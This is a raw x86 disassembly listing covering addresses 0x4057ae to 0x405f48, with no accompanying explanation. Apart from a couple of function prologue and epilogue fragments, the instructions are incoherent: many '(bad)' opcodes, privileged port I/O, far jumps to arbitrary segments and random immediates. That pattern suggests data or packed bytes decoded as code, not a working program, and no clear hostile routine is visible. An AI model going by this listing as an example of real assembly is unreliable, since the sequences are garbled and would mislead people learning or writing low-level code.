  4057ae:	in     eax,0x79
  4057b0:	mov    edx,0x16cd721a
  4057b5:	fild   DWORD PTR [edi+0x71]
  4057b8:	mov    esi,0x3bbd1ea8
  4057bd:	xor    al,0xb7
  4057bf:	std    
  4057c0:	or     DWORD PTR [ebx+0x7c3df1b8],edx
  4057c6:	mov    WORD PTR [ebp+ebp*4-0x6adb56da],es
  4057cd:	mov    cl,0x68
  4057cf:	jne    0x4057f1
  4057d1:	stos   DWORD PTR es:[edi],eax
  4057d2:	pushf  
  4057d3:	(bad)  
  4057d4:	push   ds
  4057d5:	mov    ecx,0x55750683
  4057da:	push   esi
  4057db:	sub    dl,BYTE PTR [ebx+ebx*4-0x7f]
  4057df:	dec    edi
  4057e0:	pop    eax
  4057e1:	out    dx,al
  4057e2:	mov    dh,0x8a
  4057e4:	aaa    
  4057e5:	sbb    dh,dh
  4057e7:	sar    DWORD PTR [eax],cl
  4057e9:	inc    edi
  4057ea:	fwait
  4057eb:	jmp    0x2d21:0x59f44136
  4057f2:	push   ebp
  4057f3:	(bad)  
  4057f5:	retf   0x5a6c
  4057f8:	ins    BYTE PTR es:[edi],dx
  4057f9:	pop    es
  4057fa:	push   0x47
  4057fc:	test   al,0x9b
  4057fe:	sbb    eax,0x35ed7e05
  405803:	or     al,0x9e
  405805:	push   eax
  405806:	ins    DWORD PTR es:[edi],dx
  405807:	mov    ds:0x8f0effb0,al
  40580c:	jne    0x4057e8
  40580e:	sar    bl,0x72
  405811:	aad    0xc2
  405813:	(bad)  [edi-0x2e94b18c]
  405819:	xor    bl,BYTE PTR [esi+ecx*4-0x2b]
  40581d:	dec    ebx
  40581e:	push   cs
  40581f:	sub    al,0xf3
  405821:	test   eax,0xdecbb186
  405826:	mov    al,0xd6
  405828:	aad    0x46
  40582a:	enter  0xdaac,0x11
  40582e:	ja     0x40587d
  405830:	cmp    BYTE PTR [ebx],al
  405832:	out    dx,eax
  405833:	push   edx
  405834:	push   edi
  405835:	shl    DWORD PTR [ebx+0x62],0x1d
  405839:	sahf   
  40583a:	leave  
  40583b:	mov    dl,0x72
  40583d:	aam    0x19
  40583f:	and    eax,0x3b972bb5
  405844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405846:	or     BYTE PTR [ebp-0x548b9cb9],0x59
  40584d:	xchg   esp,eax
  40584e:	fdivp  st(2),st
  405850:	mov    eax,ds:0xc9551748
  405855:	mov    DWORD PTR cs:[ecx+edx*2],esi
  405859:	pop    ecx
  40585a:	cwde   
  40585b:	xchg   ebx,eax
  40585c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40585d:	lods   al,BYTE PTR ds:[esi]
  40585e:	add    edx,DWORD PTR [edi]
  405860:	sub    eax,0xcfe684a2
  405865:	in     eax,dx
  405866:	push   0xc3ed66e6
  40586b:	iret   
  40586c:	inc    edi
  40586d:	xchg   ebx,eax
  40586e:	jnp    0x405829
  405870:	ret    
  405871:	das    
  405872:	jle    0x405824
  405874:	push   ebx
  405875:	fst    DWORD PTR [esi]
  405877:	cmp    eax,0x554d2b5a
  40587c:	lods   eax,DWORD PTR ds:[esi]
  40587d:	in     al,0xac
  40587f:	ds push ebx
  405881:	and    ecx,0x30a91874
  405887:	cmp    DWORD PTR [ecx+eiz*8],0xffffffee
  40588b:	xchg   edi,eax
  40588c:	and    DWORD PTR [ebx-0x40],esi
  40588f:	and    esi,DWORD PTR [ebx+0x27]
  405892:	fwait
  405893:	cli    
  405894:	ins    DWORD PTR es:[edi],dx
  405895:	xchg   esp,eax
  405896:	push   edx
  405897:	dec    eax
  405898:	pop    es
  405899:	mov    ecx,0x8c9522d4
  40589e:	mov    bh,0xd3
  4058a0:	int3   
  4058a1:	push   ebx
  4058a2:	pop    ds
  4058a3:	mov    cl,0x2e
  4058a5:	adc    eax,0x7f1b8f9c
  4058aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ab:	jle    0x4058a3
  4058ad:	retf   
  4058ae:	loop   0x405869
  4058b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b1:	repnz push edi
  4058b3:	adc    eax,0x63d0a7d7
  4058b8:	retf   0xc47a
  4058bb:	or     al,0xd2
  4058bd:	leave  
  4058be:	fwait
  4058bf:	scas   eax,DWORD PTR es:[edi]
  4058c0:	daa    
  4058c1:	add    eax,eax
  4058c3:	add    BYTE PTR [ebx+0x28512747],0x13
  4058ca:	push   cs
  4058cb:	gs cli 
  4058cd:	sti    
  4058ce:	paddusw mm7,QWORD PTR cs:[edi-0x5b]
  4058d3:	or     esp,esp
  4058d5:	fsubr  QWORD PTR [edx+0x69747144]
  4058db:	loop   0x40589c
  4058dd:	inc    eax
  4058de:	jecxz  0x4058d4
  4058e0:	je     0x4058a7
  4058e2:	dec    esi
  4058e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e4:	out    0x22,eax
  4058e6:	stos   DWORD PTR es:[edi],eax
  4058e7:	nop
  4058e8:	daa    
  4058e9:	push   es
  4058ea:	add    al,BYTE PTR [esi+eiz*2]
  4058ed:	popf   
  4058ee:	iret   
  4058ef:	jns    0x4058b3
  4058f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058f2:	dec    edi
  4058f3:	jns    0x40589a
  4058f5:	test   DWORD PTR [edx],edi
  4058f7:	repz push es
  4058f9:	test   BYTE PTR [ebx-0x79],bh
  4058fc:	mov    bh,0xd9
  4058fe:	jp     0x405920
  405900:	retf   0xfd60
  405903:	pop    esi
  405904:	xchg   esi,eax
  405905:	gs push cs
  405907:	or     DWORD PTR [edi+0x22d78821],eax
  40590d:	sub    dh,0x24
  405910:	cmp    BYTE PTR [esi+0x34],0x9d
  405914:	fmul   DWORD PTR [ebp-0x61f8f080]
  40591a:	pop    ebp
  40591b:	mov    ebx,0x88fe2eff
  405920:	sbb    BYTE PTR [ebp+eax*1+0x15],dh
  405924:	push   ss
  405925:	dec    esi
  405926:	(bad)  
  405927:	mov    ebx,0xe010e842
  40592c:	dec    ebp
  40592d:	xchg   edi,eax
  40592e:	jb     0x4058da
  405930:	sub    al,0x15
  405932:	sbb    al,0x79
  405934:	push   ds
  405935:	sbb    edx,DWORD PTR [ebx-0x3a]
  405938:	ss ins DWORD PTR es:[edi],dx
  40593a:	gs dec edi
  40593c:	(bad)  
  40593d:	outs   dx,BYTE PTR ds:[esi]
  40593e:	mov    esi,DWORD PTR [ebp+0x33]
  405941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405942:	adc    DWORD PTR ds:0xeaa9ab44,esi
  405948:	fs ret 
  40594a:	lea    esi,[eax-0x42]
  40594d:	lods   al,BYTE PTR ds:[esi]
  40594e:	stc    
  40594f:	fisub  WORD PTR [ecx]
  405951:	mov    al,0xc0
  405953:	mov    ?,WORD PTR [ecx]
  405955:	sahf   
  405956:	inc    edx
  405957:	scas   eax,DWORD PTR es:[edi]
  405958:	xchg   esi,eax
  405959:	lahf   
  40595a:	shr    DWORD PTR [ebp-0x68],cl
  40595d:	mov    al,ds:0xa6bb4ef3
  405962:	hlt    
  405963:	jo     0x4058f3
  405965:	or     BYTE PTR [edx+0x348d068f],dh
  40596b:	mov    edi,0x80db0cc4
  405970:	xor    DWORD PTR [ecx+0x35],esi
  405973:	and    al,0xe9
  405975:	and    al,0xbe
  405977:	push   ecx
  405978:	jne    0x4059be
  40597a:	(bad)  
  40597b:	jmp    0x553c:0xe43470e4
  405982:	loopne 0x40596a
  405984:	cmc    
  405985:	xchg   edi,eax
  405986:	jno    0x4059fe
  405988:	xor    edi,edi
  40598a:	xchg   esp,eax
  40598b:	xor    BYTE PTR [ebx-0x51e614ff],ah
  405991:	cmp    ecx,DWORD PTR [edx]
  405993:	mov    dh,0x7f
  405995:	xchg   ecx,eax
  405996:	ja     0x405993
  405998:	add    DWORD PTR [ebx*8+0x6a136ee1],ebx
  40599f:	sbb    bh,ch
  4059a1:	cdq    
  4059a2:	mov    ebp,0x5d6b2924
  4059a7:	fsub   DWORD PTR [edi+0x74]
  4059aa:	ficom  WORD PTR [ecx]
  4059ac:	nop
  4059ad:	outs   dx,DWORD PTR ds:[esi]
  4059ae:	mov    bh,0x65
  4059b0:	jmp    0xfa5c:0xbd393b2d
  4059b7:	mov    esi,0xa1854751
  4059bc:	dec    edi
  4059bd:	test   DWORD PTR [ebp+0x1f3346ae],0x7e50e9ab
  4059c7:	mov    edi,0x86a754b0
  4059cc:	cmp    al,0x4b
  4059ce:	ret    0x2016
  4059d1:	push   es
  4059d2:	popa   
  4059d3:	call   0xfa8a:0x57438af1
  4059da:	pop    edi
  4059db:	scas   eax,DWORD PTR es:[edi]
  4059dc:	dec    ecx
  4059dd:	mov    esi,0xce28a377
  4059e2:	xor    bl,BYTE PTR [edx]
  4059e4:	adc    BYTE PTR [edx+0x62],bh
  4059e7:	dec    eax
  4059e8:	sub    DWORD PTR [edi],edx
  4059ea:	(bad)  
  4059eb:	dec    esp
  4059ec:	bound  edx,QWORD PTR [esi-0x7d]
  4059ef:	adc    al,0x4b
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x4059ff
  405a20:	inc    eax
  405a21:	lods   eax,DWORD PTR ds:[esi]
  405a22:	cwde   
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a4b
  405a2c:	or     cl,bh
  405a2e:	in     eax,0x83
  405a30:	in     al,dx
  405a31:	loope  0x4059e7
  405a33:	test   al,0x0
  405a35:	je     0x405a91
  405a37:	adc    ch,0x75
  405a3a:	imul   edi,ebp,0xe89d9ce7
  405a40:	jecxz  0x4059cf
  405a42:	fistp  WORD PTR [esi-0x36]
  405a45:	sub    al,0xe
  405a47:	add    eax,0x26987bb2
  405a4c:	outs   dx,BYTE PTR ds:[esi]
  405a4d:	inc    edi
  405a4e:	mov    esp,0xdb7f71ec
  405a53:	fdiv   DWORD PTR [edx]
  405a55:	jge    0x405a72
  405a57:	test   al,0x3b
  405a59:	pop    ss
  405a5a:	mov    eax,0x70b5ab6e
  405a5f:	or     eax,0x22152f2c
  405a64:	ja     0x405acd
  405a66:	push   edx
  405a67:	ret    0x84d0
  405a6a:	fisttp DWORD PTR [ebx+ecx*4-0x6db90ea4]
  405a71:	push   ss
  405a72:	sub    eax,0xe301aa6b
  405a77:	or     edi,esi
  405a79:	in     eax,0x27
  405a7b:	cmp    ecx,DWORD PTR [edx]
  405a7d:	mov    edx,0xbcafd089
  405a82:	imul   edx,DWORD PTR [edx],0x2e64fa50
  405a88:	jp     0x405a1f
  405a8a:	pushf  
  405a8b:	nop
  405a8c:	sub    esi,DWORD PTR [eax]
  405a8e:	rcl    DWORD PTR [eax],0xb5
  405a91:	cmp    cl,BYTE PTR [esp+ecx*8]
  405a94:	rcl    BYTE PTR [edx*4+0x57f9e85d],0x51
  405a9c:	inc    ebx
  405a9d:	or     edx,DWORD PTR [esi+0x69]
  405aa0:	adc    ah,dl
  405aa2:	inc    ebp
  405aa3:	clc    
  405aa4:	mov    ch,0xf3
  405aa6:	cmp    BYTE PTR [esi],dl
  405aa8:	(bad)  [esi-0x79]
  405aab:	shl    BYTE PTR [esi],1
  405aad:	outs   dx,BYTE PTR ds:[esi]
  405aae:	outs   dx,BYTE PTR ds:[esi]
  405aaf:	arpl   WORD PTR [edx+ecx*4-0x19b86051],ax
  405ab6:	push   eax
  405ab7:	div    BYTE PTR [esi+ebp*8+0x1bb1dc8]
  405abe:	inc    ebp
  405abf:	leave  
  405ac0:	or     BYTE PTR [esi+0xf],al
  405ac3:	aaa    
  405ac4:	rol    DWORD PTR [eax],0xfd
  405ac7:	mov    ds:0xbcb20f35,eax
  405acc:	adc    ecx,DWORD PTR [edi+0x4ea1c057]
  405ad2:	je     0x405a56
  405ad4:	and    BYTE PTR ds:0x723e84fa,bl
  405ada:	dec    ebx
  405adb:	fld    TBYTE PTR [esi-0x29e67963]
  405ae1:	not    BYTE PTR [ecx+edx*4-0x6c]
  405ae5:	mov    dh,0xc4
  405ae7:	inc    esp
  405ae8:	mov    ?,WORD PTR [esi-0x13]
  405aeb:	add    bl,BYTE PTR ds:0x2a6e49f0
  405af1:	mov    eax,0x26ea3218
  405af6:	pusha  
  405af7:	add    al,0x5d
  405af9:	ja     0x405b31
  405afb:	sub    al,0x5c
  405afd:	sbb    eax,DWORD PTR [edi+ecx*2-0x4743f24b]
  405b04:	int    0x20
  405b06:	in     eax,0x26
  405b08:	stos   DWORD PTR es:[edi],eax
  405b09:	cmp    bl,BYTE PTR [ebx]
  405b0b:	xor    BYTE PTR [edi-0x5b80c3cf],bh
  405b11:	imul   eax,ebx,0x6b
  405b14:	adc    dh,ah
  405b16:	popa   
  405b17:	in     eax,dx
  405b18:	xchg   edi,eax
  405b19:	cmp    dl,ah
  405b1b:	xchg   BYTE PTR [ebx-0x69be0ead],cl
  405b21:	jne    0x405b7f
  405b23:	mov    edx,0x5c0be8f0
  405b28:	sbb    al,0x36
  405b2a:	in     eax,dx
  405b2b:	das    
  405b2c:	lds    esi,FWORD PTR [ebx]
  405b2e:	cmp    edi,eax
  405b30:	xor    ah,BYTE PTR [esi]
  405b32:	imul   eax,DWORD PTR [ecx+ebp*2],0xffa0f915
  405b39:	sub    al,BYTE PTR [edi]
  405b3b:	jmp    0x405b4d
  405b3d:	mov    dh,0x62
  405b3f:	cmp    eax,0xca7acdc3
  405b44:	and    ebp,DWORD PTR [eax-0xf19b16b]
  405b4a:	sbb    bh,bl
  405b4c:	addr16 mov eax,0xf3f4f34c
  405b52:	xor    eax,0x6c57680
  405b57:	inc    edi
  405b58:	out    0x7,eax
  405b5a:	push   0x58
  405b5c:	adc    esp,esi
  405b5e:	mov    ds:0x1e31c5f1,al
  405b63:	cmp    al,0xd6
  405b65:	jnp    0x405af2
  405b67:	mov    ch,0xc0
  405b69:	mov    eax,0x759e6821
  405b6e:	test   BYTE PTR [eax+0x443d06e9],bh
  405b74:	mov    al,0x28
  405b76:	add    edx,DWORD PTR cs:[eax]
  405b79:	mov    eax,0x8ca6496e
  405b7e:	pop    ebp
  405b7f:	jp     0x405bbb
  405b81:	sahf   
  405b82:	mov    edx,0xb63dac32
  405b87:	sub    al,0x5d
  405b89:	sbb    eax,0x160b5ddb
  405b8e:	mov    esp,gs
  405b90:	mov    al,0xd7
  405b92:	inc    edx
  405b93:	dec    edi
  405b94:	inc    edi
  405b95:	mov    ds:0x69612a0,al
  405b9a:	outs   dx,BYTE PTR ds:[esi]
  405b9b:	scas   eax,DWORD PTR es:[edi]
  405b9c:	pusha  
  405b9d:	or     bl,bl
  405b9f:	xor    ebp,edx
  405ba1:	fild   DWORD PTR [edx+0x11]
  405ba4:	ret    0xa8f
  405ba7:	dec    edx
  405ba8:	or     eax,0xaf5025ba
  405bad:	iret   
  405bae:	add    al,0xaa
  405bb0:	cdq    
  405bb1:	add    eax,0x2fe5e591
  405bb6:	stos   DWORD PTR es:[edi],eax
  405bb7:	lahf   
  405bb8:	mov    dh,0x3d
  405bba:	jmp    0xe7391bb9
  405bbf:	cli    
  405bc0:	adc    ebx,ecx
  405bc2:	loope  0x405be8
  405bc4:	ins    DWORD PTR es:[edi],dx
  405bc5:	cmp    eax,0x26fdd24f
  405bca:	je     0x405b85
  405bcc:	add    al,0x68
  405bce:	push   edi
  405bcf:	scas   eax,DWORD PTR es:[edi]
  405bd0:	(bad)  
  405bd1:	adc    eax,ebp
  405bd3:	sbb    esp,DWORD PTR [edx-0x4b]
  405bd6:	mov    cs,WORD PTR ds:0x7b4f286e
  405bdc:	jp     0x405c41
  405bde:	mov    ch,0x51
  405be0:	(bad)  
  405be1:	cmp    BYTE PTR [ecx+0x5da2c470],ah
  405be7:	sbb    BYTE PTR [edx-0x61d13c42],cl
  405bed:	inc    ecx
  405bee:	xchg   edi,eax
  405bef:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  405bf1:	enter  0xf259,0x9
  405bf5:	sbb    al,ch
  405bf7:	add    al,BYTE PTR [esi]
  405bf9:	xchg   ebx,eax
  405bfa:	dec    esp
  405bfb:	mov    eax,0x2f2b850e
  405c00:	stos   DWORD PTR es:[edi],eax
  405c01:	dec    esi
  405c02:	jb     0x405c63
  405c04:	adc    eax,DWORD PTR [eax+eax*8-0x44e65f4a]
  405c0b:	add    eax,0xabf221
  405c10:	inc    edx
  405c11:	jge    0x405c11
  405c13:	(bad)  
  405c14:	push   eax
  405c15:	shl    edx,0xc2
  405c18:	push   cs
  405c19:	rol    eax,cl
  405c1b:	nop
  405c1c:	lahf   
  405c1d:	sbb    eax,0xf768814b
  405c22:	fucomp st(7)
  405c24:	aas    
  405c25:	cmp    eax,0x5b912ae
  405c2a:	adc    al,0xc
  405c2c:	jns    0x405c29
  405c2e:	adc    eax,0xb3036905
  405c33:	inc    edi
  405c34:	aam    0x26
  405c36:	sti    
  405c37:	or     eax,0x354da454
  405c3c:	std    
  405c3d:	imul   edx,edx,0x41
  405c40:	dec    edi
  405c41:	call   0x1e13023a
  405c46:	ja     0x405c3b
  405c48:	xchg   BYTE PTR [edi+0x3b9f38a],al
  405c4e:	leave  
  405c4f:	js     0x405c3e
  405c51:	fidiv  WORD PTR [ecx-0x2a]
  405c54:	retf   0x7641
  405c57:	cmp    DWORD PTR [ebp+0x27353fc3],edi
  405c5d:	or     bh,bl
  405c5f:	test   eax,0x70fbcf99
  405c64:	faddp  st(1),st
  405c66:	mov    cl,0xcd
  405c68:	push   ebp
  405c69:	cmp    bl,0xd
  405c6c:	f2xm1  
  405c6e:	mov    ah,0x59
  405c70:	jnp    0x405c66
  405c72:	inc    esi
  405c73:	or     esi,DWORD PTR ds:0x644c73a
  405c79:	enter  0xba82,0x65
  405c7d:	call   0x6938:0x74746ad1
  405c84:	sub    dh,al
  405c86:	repnz in al,dx
  405c88:	push   ecx
  405c89:	je     0x405c52
  405c8b:	xchg   cl,dh
  405c8d:	call   FWORD PTR [ecx]
  405c8f:	pop    edx
  405c90:	hlt    
  405c91:	xor    ebx,DWORD PTR [edi+0x5a]
  405c94:	pushf  
  405c95:	dec    eax
  405c96:	xchg   esp,eax
  405c97:	fmul   st,st(2)
  405c99:	pop    edi
  405c9a:	jns    0x405c8a
  405c9c:	out    0x5c,ax
  405c9f:	std    
  405ca0:	cli    
  405ca1:	mov    al,0xe
  405ca3:	sub    BYTE PTR [edx],dl
  405ca5:	fstp   DWORD PTR [ebx+ebp*2+0x22]
  405ca9:	adc    ah,cl
  405cab:	retf   0xb71b
  405cae:	test   al,0x29
  405cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb1:	mov    ebx,DWORD PTR [esi]
  405cb3:	cmp    cl,BYTE PTR [eax+edi*4]
  405cb6:	adc    DWORD PTR [ecx+0x71],edi
  405cb9:	xchg   BYTE PTR [ebx+edi*1+0x5ed17687],dh
  405cc0:	sub    DWORD PTR [edx-0x3d],esi
  405cc3:	div    BYTE PTR [ecx+0x55]
  405cc6:	add    DWORD PTR [ecx],ecx
  405cc8:	push   ss
  405cc9:	push   ss
  405cca:	sbb    al,0x2b
  405ccc:	cmp    ch,BYTE PTR [eax]
  405cce:	sub    ebp,DWORD PTR [ecx+0x69]
  405cd1:	mov    al,0x6c
  405cd3:	sbb    BYTE PTR [edx-0x49],bl
  405cd6:	dec    ecx
  405cd7:	mov    eax,ds:0xcb2e4ce7
  405cdc:	pop    edx
  405cdd:	ds pop ss
  405cdf:	rcl    cl,cl
  405ce1:	or     BYTE PTR [ebp-0x61],dl
  405ce4:	mov    esp,0xdcc7eb83
  405ce9:	shl    dl,0xbb
  405cec:	scas   al,BYTE PTR es:[edi]
  405ced:	lods   al,BYTE PTR ds:[esi]
  405cee:	inc    ecx
  405cef:	bound  eax,QWORD PTR [eax]
  405cf1:	add    DWORD PTR [ecx-0x45],ecx
  405cf4:	(bad)  
  405cf5:	jne    0x405cc0
  405cf7:	adc    ebx,DWORD PTR [ecx+0xf]
  405cfa:	jmp    0x405cf4
  405cfc:	jle    0x405d22
  405cfe:	xor    edx,edx
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0x67bb4c09
  405d13:	inc    ebx
  405d14:	retf   
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d7e
  405d1e:	mov    ecx,0x2a40c6b5
  405d23:	mov    bl,0x23
  405d25:	(bad)
  405d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d2a:	pop    ecx
  405d2b:	outs   dx,DWORD PTR ds:[esi]
  405d2c:	(bad)  
  405d2e:	dec    edi
  405d2f:	add    ch,bh
  405d31:	retf   0x9b49
  405d34:	dec    eax
  405d35:	fidivr DWORD PTR [edi-0x6713c8bf]
  405d3b:	addr16 data16 (bad) 
  405d3e:	dec    ebp
  405d3f:	call   0x6b36:0x690899ba
  405d46:	push   eax
  405d47:	dec    ah
  405d49:	cmp    DWORD PTR [ebx-0x4b2e9e89],esi
  405d4f:	pushf  
  405d50:	stos   BYTE PTR es:[edi],al
  405d51:	mov    edx,0x143baae9
  405d56:	mov    BYTE PTR [ebx+esi*2],ch
  405d59:	cs add al,0xc3
  405d5c:	mov    dl,0x63
  405d5e:	lahf   
  405d5f:	cli    
  405d60:	sar    BYTE PTR [edx+esi*4+0x3f],cl
  405d64:	pop    ecx
  405d65:	jge    0x405d96
  405d67:	ret    
  405d68:	sub    edi,DWORD PTR [edi+ecx*1+0x37]
  405d6c:	(bad)  
  405d6d:	mov    ds:0x4dfddb90,eax
  405d72:	dec    eax
  405d73:	(bad)  
  405d74:	jo     0x405d57
  405d76:	cmp    DWORD PTR [ebx+0x59de0873],0x6b
  405d7d:	mov    eax,edi
  405d7f:	nop
  405d80:	xchg   esi,eax
  405d81:	mov    eax,0x2e408dc
  405d86:	mov    dh,0xae
  405d88:	dec    edx
  405d89:	imul   ebx,DWORD PTR [edx-0x3c],0x27
  405d8d:	dec    edi
  405d8e:	push   ecx
  405d8f:	mov    ah,0xfe
  405d91:	test   eax,0x3bfbba81
  405d96:	(bad)  
  405d97:	(bad)  
  405d98:	and    ecx,DWORD PTR [esi]
  405d9a:	pop    esi
  405d9b:	push   0x1f39ed4f
  405da0:	pop    es
  405da1:	ror    DWORD PTR [eax],cl
  405da3:	out    0xf1,eax
  405da5:	pop    ds
  405da6:	in     eax,dx
  405da7:	loope  0x405d89
  405da9:	les    ebx,FWORD PTR [ebx-0xb5e840b]
  405daf:	add    ebx,DWORD PTR [edi-0x43554d4d]
  405db5:	test   eax,0xcddee7b0
  405dba:	add    WORD PTR [ebp-0x1fdcf029],si
  405dc1:	sbb    ch,al
  405dc3:	in     al,0x99
  405dc5:	stc    
  405dc6:	in     eax,0x59
  405dc8:	fdiv   DWORD PTR ds:[edi]
  405dcb:	std    
  405dcc:	ret    
  405dcd:	aam    0xeb
  405dcf:	mov    WORD PTR [edx],?
  405dd1:	out    dx,al
  405dd2:	mov    ebp,0xc619d5c6
  405dd7:	das    
  405dd8:	(bad)  
  405dd9:	enter  0x56b3,0x49
  405ddd:	arpl   WORD PTR [ecx],bp
  405ddf:	push   edi
  405de0:	sub    eax,0xffd0f662
  405de5:	fiadd  DWORD PTR [edi-0x26fb6dd9]
  405deb:	xchg   ebp,eax
  405dec:	mov    eax,0xcb853b5e
  405df1:	pop    edi
  405df2:	jb     0x405d81
  405df4:	cmp    eax,0x17a7db6f
  405df9:	rcl    dl,1
  405dfb:	sub    DWORD PTR [edi],eax
  405dfd:	add    al,0x9c
  405dff:	xor    DWORD PTR [ebp+0x19],ebx
  405e02:	push   ebp
  405e03:	ret    
  405e04:	jnp    0x405da1
  405e06:	fldenv [esi-0x62]
  405e09:	cli    
  405e0a:	icebp  
  405e0b:	fld    QWORD PTR [edx-0x26cf14f6]
  405e11:	dec    edi
  405e12:	les    edx,FWORD PTR ds:0x2a0ea6c8
  405e18:	xor    dh,BYTE PTR [ebp-0x79]
  405e1b:	or     eax,0x999f72a
  405e20:	mov    al,ds:0x67e7e1ae
  405e25:	sub    DWORD PTR [esp+edx*8-0x7b],0x71
  405e2a:	cmp    eax,0xf406a201
  405e2f:	aad    0xe4
  405e31:	sbb    al,0xba
  405e33:	or     DWORD PTR [edx+0x20],ebx
  405e36:	inc    ecx
  405e37:	scas   eax,DWORD PTR es:[edi]
  405e38:	cmp    ch,BYTE PTR [ecx+ecx*1+0x1]
  405e3c:	out    0xb4,al
  405e3e:	(bad)  
  405e3f:	ins    DWORD PTR es:[edi],dx
  405e40:	in     al,0xf4
  405e42:	shr    BYTE PTR [ecx+0x6ee0bf6f],0x3b
  405e49:	clc    
  405e4a:	pop    ebp
  405e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e4c:	outs   dx,DWORD PTR ds:[esi]
  405e4d:	retf   
  405e4e:	xor    BYTE PTR [eax+0x7c],bh
  405e51:	inc    edx
  405e52:	add    ebp,DWORD PTR [edx+0x35]
  405e55:	repz mov WORD PTR [esi-0x1e431ae5],es
  405e5c:	fadd   st,st(0)
  405e5e:	ret    0x7fca
  405e61:	stc    
  405e62:	lahf   
  405e63:	mov    WORD PTR ds:0xc7c208e6,ds
  405e69:	pop    ss
  405e6a:	aad    0xa4
  405e6c:	pop    esp
  405e6d:	pop    edi
  405e6e:	sti    
  405e6f:	adc    DWORD PTR [ebp-0x16],esi
  405e72:	push   ecx
  405e73:	hlt    
  405e74:	mov    edi,0xcf6fd46d
  405e79:	jg     0x405ee2
  405e7b:	cmp    BYTE PTR [esi+edi*4],0xf4
  405e7f:	sub    eax,0x1a70c888
  405e84:	sbb    ch,BYTE PTR [ebp-0x7ba6e1e2]
  405e8a:	add    bl,0x53
  405e8d:	ss cmc 
  405e8f:	push   edi
  405e90:	int3   
  405e91:	mov    BYTE PTR [ecx-0x4a],al
  405e94:	jno    0x405ed5
  405e96:	std    
  405e97:	xchg   esi,eax
  405e98:	mov    dh,0x43
  405e9a:	push   cs
  405e9b:	pop    ebx
  405e9c:	pop    ecx
  405e9d:	scas   al,BYTE PTR es:[edi]
  405e9e:	push   ss
  405e9f:	lahf   
  405ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ea1:	ficomp WORD PTR gs:[esi+ecx*1]
  405ea5:	outs   dx,BYTE PTR ds:[esi]
  405ea6:	jg     0x405e92
  405ea8:	(bad)  
  405ea9:	out    0xb5,al
  405eab:	cmp    eax,0xd9677bf2
  405eb0:	mov    WORD PTR [ecx-0x2e],es
  405eb3:	inc    ebx
  405eb4:	or     al,0x40
  405eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb7:	sahf   
  405eb8:	push   ebx
  405eb9:	imul   esp,DWORD PTR [eax-0x60],0x28220ea4
  405ec0:	adc    ch,BYTE PTR [edi+0x22]
  405ec3:	cmp    ax,0x2063
  405ec7:	mov    bh,0xc3
  405ec9:	sbb    bl,BYTE PTR [eax]
  405ecb:	dec    ecx
  405ecc:	stc    
  405ecd:	adc    BYTE PTR [ebx-0x7287ecf1],bl
  405ed3:	jno    0x405e65
  405ed5:	gs xor al,0xbd
  405ed8:	fwait
  405ed9:	dec    edi
  405eda:	retf   
  405edb:	mov    eax,ds:0x85964bc7
  405ee0:	sub    DWORD PTR [ecx],esp
  405ee2:	jl     0x405f2a
  405ee4:	cdq    
  405ee5:	cmc    
  405ee6:	dec    eax
  405ee7:	retf   
  405ee8:	lea    esp,[edx+edi*4+0x59]
  405eec:	ret    
  405eed:	inc    edx
  405eee:	cli    
  405eef:	xlat   BYTE PTR ds:[ebx]
  405ef0:	mov    ecx,0x7705118b
  405ef5:	out    0xf4,al
  405ef7:	mov    al,0x71
  405ef9:	pop    esi
  405efa:	fsubr  DWORD PTR [esi-0x52]
  405efd:	fdivp  st(0),st
  405eff:	sub    eax,0xe4fd82cb
  405f04:	aaa    
  405f05:	js     0x405e8b
  405f07:	ja     0x405f3d
  405f09:	or     al,0x68
  405f0b:	push   ss
  405f0c:	test   DWORD PTR [eax-0x7a86e178],ebp
  405f12:	and    ebx,ecx
  405f14:	(bad)  
  405f15:	das    
  405f16:	jne    0x405f72
  405f18:	dec    esp
  405f19:	inc    ecx
  405f1a:	sub    DWORD PTR [ecx-0x4b],esi
  405f1d:	and    BYTE PTR [edx+0x69],ch
  405f20:	mov    esi,0x1102bc61
  405f25:	push   esi
  405f26:	mov    bh,0xe2
  405f28:	mov    ch,0xeb
  405f2a:	jg     0x405ef6
  405f2c:	mov    bh,0xd5
  405f2e:	add    BYTE PTR [edi+0x3],cl
  405f31:	loop   0x405f3d
  405f33:	cli    
  405f34:	repnz mov ds:0x722678eb,al
  405f3a:	push   ebp
  405f3b:	add    DWORD PTR [eax+edi*1-0x27],eax
  405f3f:	mov    ds:0x67324e45,al
  405f44:	inc    ebx
  405f45:	outs   dx,BYTE PTR ds:[esi]
  405f46:	sub    al,0x99
  405f48:	sub    al,dh
